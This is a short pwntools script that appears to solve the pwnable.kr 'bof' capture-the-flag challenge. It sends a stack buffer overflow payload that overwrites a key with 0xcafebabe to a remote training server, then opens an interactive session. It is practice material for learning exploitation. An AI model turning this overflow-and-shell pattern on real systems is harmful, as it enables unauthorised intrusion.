import pwn

pwn.context.log_level = 'debug'

key = pwn.p32(0xcafebabe)
p = b'\x65' * (0x2c + 4 + 4) + key

conn = pwn.remote('pwnable.kr', 9000)
conn.sendline(p)
conn.interactive()
